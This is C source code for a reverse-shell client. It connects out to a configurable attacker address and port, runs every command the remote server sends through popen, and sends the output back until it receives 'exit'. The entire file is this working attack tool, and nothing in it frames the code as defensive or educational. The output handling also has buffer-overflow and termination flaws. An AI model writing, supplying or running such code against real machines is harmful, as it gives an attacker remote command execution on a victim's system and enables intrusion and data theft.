#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>

#include <arpa/inet.h>

int main(){
    // Create a socket (Get the file descriptor)
    int networkSocket = 0;
    networkSocket = socket(AF_INET, SOCK_STREAM, 0);
    
    // Specify an address for the socket to connect to
    struct sockaddr_in serverAddress = {0};
    serverAddress.sin_family = AF_INET;     // AF_INET = IPV4
    serverAddress.sin_port = htons(1234);   // PORT
    inet_pton(AF_INET, "0.0.0.0", &(serverAddress.sin_addr)); // Change this  

    // Connecting to the server
    int connect_fd = connect(networkSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress));
    if (connect_fd == -1){
        printf("Connection Failed.\n");
        close(networkSocket);
        return 0;
    }

    // Receiving info from the server
    char serverResponse[256] = {0};

    // Open Pipes for Shell
    FILE * processRead;
    char clientOutput[256] = {0};
    char fullOutput[256] = {0};

    while (true){
        // Receiving server message
        recv(networkSocket, &serverResponse, sizeof(serverResponse), 0);
        
        // IF server sends "exit", we close the application
        if (strncmp(serverResponse, "exit",4) == 0){
            break;
        }
        
        // If serverResponse is not "exit":
        // Execute commands
        if (serverResponse[0] != 0){
            processRead = popen(serverResponse,"r");

            // Concatenate the output and send to the server
            while(fgets(clientOutput, sizeof(clientOutput), processRead) != NULL){
                strcat(fullOutput, clientOutput);
            }
            pclose(processRead);
            send(networkSocket, fullOutput, sizeof(fullOutput), 0);
            strcpy(fullOutput,"");
            strcpy(clientOutput,"");
        }
    }

    // Cleanup
    close(networkSocket);

    return 0;
}
